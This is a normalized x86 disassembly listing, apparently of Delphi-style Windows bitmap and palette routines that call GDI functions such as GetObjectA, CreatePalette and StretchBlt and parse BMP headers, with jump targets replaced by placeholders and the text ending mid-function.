pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41ffe4
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403894
call sub_4038e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_420044
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_4200a8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_41f59c
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4202a3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41dfa8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41dfa8
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41dfa8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42025b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_41f9e0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4202b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f110
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f80c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42031c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_420a2c
mov eax [ esi + 0x28 ]
call sub_41f810
mov eax [ esi + 0x2c ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414000
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_420358
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420410
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420c9c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_41f80c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f810
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41402c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_420448
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_420a2c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4204d7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_420044
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_41f9e0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420c9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4204dc
mov eax [ ebp - 0x8 ]
call sub_41bf98
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403894
call sub_4038e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_420508
push ebx
mov ebx eax
mov eax ebx
call sub_4207fc
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cc80
pop ebx
retn
sub_420538
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415af8
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_420a2c
lea eax [ ebx + 0x2c ]
call sub_40cc80
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_420c9c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4205ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41dc90
mov eax ebx
call sub_420b3c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_420938
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4207e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41dbbc
push eax
call SetStretchBltMode
mov eax ebx
call sub_42087c
mov dl [ r-xdata ]
call sub_41dc90
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_420adc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_42087c
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4207ef
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42077d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41dfa8
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_42087c
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e14c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4207fc
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_420a3c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_420448
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41df00
sub_42087c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_420a3c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f618
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_420508
sub_4208c4
push ebx
mov ebx eax
mov eax ebx
call sub_420a2c
mov eax ebx
call sub_420a3c
mov edx ebx
mov eax ebx
call sub_420508
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4208e8
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_420968
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c868
mov eax ebx
call sub_420938
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_42087c
xor edx edx
pop ecx
call sub_41db48
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4209b8
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_420b3c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41f9e0
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_420a3c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_415a94
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_420abf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_420adc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_420a2c
mov eax ebx
call sub_420a3c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_420968
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4200a8
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_41f59c
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_420b3c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e698
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_41f59c
push 0x0
call GetDC
call sub_41dfa8
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_420bf4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41de7c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_420448
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_420a2c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_420c78
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415a74
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42132c
pop esi
pop ebx
retn
sub_420c9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420d23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_420d83
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f810
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_41f80c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d8a
push rw-data
call LeaveCriticalSection
retn
sub_420d9c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42132c
pop edx
pop edi
pop esi
pop ebx
retn
sub_420dc4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026cc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_4212e1
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4212b4
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b04
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41de94
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_415d10
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b04
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_415ca0
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41e118
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e138
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
